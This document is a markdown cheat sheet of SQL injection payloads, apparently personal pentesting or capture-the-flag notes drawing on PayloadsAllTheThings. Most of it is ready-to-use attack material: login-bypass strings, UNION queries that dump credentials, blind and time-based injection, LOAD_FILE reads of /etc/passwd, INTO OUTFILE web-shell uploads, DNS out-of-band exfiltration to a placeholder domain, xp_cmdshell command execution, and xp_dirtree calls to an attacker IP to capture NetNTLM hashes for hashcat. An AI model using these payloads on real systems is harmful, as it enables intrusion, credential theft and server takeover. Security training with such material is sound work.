# Payload resource: https://github.com/swisskyrepo/PayloadsAllTheThings

## Blind Testing Payload:

 - ' ORDER BY NUM;-- - (Keep increasing the NUM value until you get an error. This not only confirms an SQLi vulnerability, but also enumerates the database columns as well)

### 1) Input box non-string

#### payload: 1 or 1=1-- -

### 2) Input box string

#### payload: 1' or '1'='1'-- -

### 3) URL injection

#### payload: http://site.com/sqli/login?profile=-1'or 1=1-- -&password=a

### 4) POST injection

#### Use proxy (Burp) or remove/disable JavaScript

## Database Identification

### 1) MySQL and MSSQL: 'nickname=@@version,email='

### 2) Oracle: 'nickname=(SELECT Gamer FROM v(version),email='

### 3) SQLite: 'nickname=sqlite_version(),email='

## Database enumeration:

### Columns enumeration:

#### 1' UNION SELECT NULL-- -

#### 1' UNION SELECT NULL,NULL-- -

## TIP:

#### Keep adding NULL until you see an error. The last correct query reveals the amount of columns in the database.

## group_concat(table_name)

## Manual Enumeration

#### 1) ' (Error Based)

#### 2) '1 order by (num)' (column enumeration)

#### 3) '1 UNION SELECT database()'

#### 4) '1 UNION SELECT concat(schema_name)' from information_schema.schema'

#### 5) '1 UNION SELECT table_name from information_schema.tables WHERE table_schema = database()'

#### 6) '1 UNION SELECT 1, concat(+1," ",+2, " ",+3),3,4 from "name"

## BOOLEAN BLIND SQL INJECTION 

### Tools: Burpsuite Intruder Sniper Mode

### Usage:

#### 1) admin' and substring(database(),1,1)="$a$" #&password=password 

#### 2) Intruder mode: Sniper. Payload list: Whole alphabet and numbers

#### 3) Essentially, we brute-force the database to give us an answer if the letter/number exists (hence the boolean-based SQLi) based on the function/database content (users/passwords) it contains.


## SQL Injection Webshell Upload

### Requirements: User has write access to the server via SQL injection

#### 1) http://TARGET_IP/room.php?cod=-1 union select 1,load_file('/etc/passwd'),3,4,5,6,7 (Check for read access)

#### 2) http://10.10.10.143/room.php?cod=-1 union select 1,load_file('/etc/apache2/sites-enabled/000-default.conf'),3,4,5,6,7 (Check for write access)


#### 3) http://TARGET_IP/room.php?cod=-1 union select 1,'<?php system($_REQUEST["exec"]);?>',3,4,5,6,7 into outfile '/var/www/html/pwned.php' (Upload the webshell)

## MySQL

| **Command**   | **Description**   |
| --------------|-------------------|
| **General** |
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p` | login to mysql database |
| `SHOW DATABASES` | List available databases |
| `USE users` | Switch to database |
| **Tables** |
| `CREATE TABLE logins (id INT, ...)` | Add a new table |
| `SHOW TABLES` | List available tables in current database |
| `DESCRIBE logins` | Show table properties and columns |
| `INSERT INTO table_name VALUES (value_1,..)` | Add values to table |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)` | Add values to specific columns in a table |
| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>` | Update table values |
| **Columns** |
| `SELECT * FROM table_name` | Show all columns in a table |
| `SELECT column1, column2 FROM table_name` | Show specific columns in a table |
| `DROP TABLE logins` | Delete a table |
| `ALTER TABLE logins ADD newColumn INT` | Add new column |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn` | Rename column |
| `ALTER TABLE logins MODIFY oldColumn DATE` | Change column datatype |
| `ALTER TABLE logins DROP oldColumn` | Delete column |
| **Output** |
| `SELECT * FROM logins ORDER BY column_1` | Sort by column |
| `SELECT * FROM logins ORDER BY column_1 DESC` | Sort by column in descending order |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC` | Sort by two-columns |
| `SELECT * FROM logins LIMIT 2` | Only show first two results |
| `SELECT * FROM logins LIMIT 1, 2` | Only show first two results starting from index 2 |
| `SELECT * FROM table_name WHERE <condition>` | List results that meet a condition |
| `SELECT * FROM logins WHERE username LIKE 'admin%'` | List results where the name is similar to a given string |

## MySQL Operator Precedence
* Division (`/`), Multiplication (`*`), and Modulus (`%`)
* Addition (`+`) and Subtraction (`-`)
* Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
* NOT (`!`)
* AND (`&&`)
* OR (`||`)

## SQL Injection
| **Payload**   | **Description**   |
| --------------|-------------------|
| **Auth Bypass** |
| `admin' or '1'='1` | Basic Auth Bypass |
| `admin')-- -` | Basic Auth Bypass With comments |
| [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) |
| **Union Injection** |
| `' order by 1-- -` | Detect number of columns using `order by` |
| `cn' UNION select 1,2,3-- -` | Detect number of columns using Union injection |
| `cn' UNION select 1,@@version,3,4-- -` | Basic Union injection |
| `UNION select username, 2, 3, 4 from passwords-- -` | Union injection for 4 columns |
| **DB Enumeration** |
| `SELECT @@version` | Fingerprint MySQL with query output |
| `SELECT SLEEP(5)` | Fingerprint MySQL with no output |
| `cn' UNION select 1,database(),2,3-- -` | Current database name |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | List all databases |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | List all tables in a specific database |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List all columns in a specific table |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | Dump data from a table in another database |
| **Privileges** |
| `cn' UNION SELECT 1, user(), 3, 4-- -` | Find current user |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Find if user has admin privileges |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -` | Find if all user privileges |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
| **File Injection** |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read local file |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |


## Boolean-based

```sql
' AND 1=1;--
```

## Time-based

```sql
'; IF (1=1) WAITFOR DELAY '0:0:10';--
```

## DNS OOB

| SQL Function | SQL Query |
| ----- | ----- |
| `master..xp_dirtree` | `DECLARE @T varchar(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_dirtree "\\'+@T+'.YOUR.DOMAIN\\x"');` |
| `master..xp_fileexist` | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_fileexist "\\'+@T+'.YOUR.DOMAIN\\x"');` |
| `master..xp_subdirs` | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_subdirs "\\'+@T+'.YOUR.DOMAIN\\x"');` |
| `sys.dm_os_file_exists` | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM sys.dm_os_file_exists('\\'+@T+'.YOUR.DOMAIN\x');` |
| `fn_trace_gettable` | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_trace_gettable('\\'+@T+'.YOUR.DOMAIN\x.trc',DEFAULT);` |
| `fn_get_audit_file` | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_get_audit_file('\\'+@T+'.YOUR.DOMAIN\',DEFAULT,DEFAULT);` |
| `split result into sub-domains` | `DECLARE @T VARCHAR(MAX); DECLARE @A VARCHAR(63); DECLARE @B VARCHAR(63); SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), flag), 1) from flag; SELECT @A=SUBSTRING(@T,3,63); SELECT @B=SUBSTRING(@T,3+63,63); SELECT * FROM fn_get_audit_file('\\'+@A+'.'+@B+'.YOUR.DOMAIN\',DEFAULT,DEFAULT);` |

## [MSSQL] RCE

```sql
-- Check if we are sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Enable 'Advanced Options'
EXEC sp_configure 'Show Advanced Options', '1';
RECONFIGURE;

-- Enable 'xp_cmdshell'
EXEC sp_configure 'xp_cmdshell', '1';
RECONFIGURE;

-- Ping ourselves
EXEC xp_cmdshell 'ping /n 4 192.168.43.164';
```

## [MSSQL] NetNTLM

```shell-session
[!bash!]$ sudo python3 Responder.py -I eth0
```

```sql
EXEC master..xp_dirtree '\\<ATTACKER_IP>\myshare', 1, 1;
```

```shell-session
[!bash!]$ hashcat -m 5600 'jason::SQL01:bd7f162c24a39a0f:94DF80C5ABB...SNIP...000000' /usr/share/wordlists/rockyou.txt
```

## [MSSQL] File Read

```sql
-- Check if we have the permissions needed to read files
SELECT COUNT(*) FROM fn_my_permissions(NULL, 'DATABASE') WHERE permission_name = 'ADMINISTER BULK OPERATIONS' OR permission_name = 'ADMINISTER DATABASE BULK OPERATIONS';

-- Get the length of a file
SELECT LEN(BulkColumn) FROM OPENROWSET(BULK '<path>', SINGLE_CLOB) AS x

-- Get the contents of a file
SELECT BulkColumn FROM OPENROWSET(BULK '<path>', SINGLE_CLOB) AS x
```
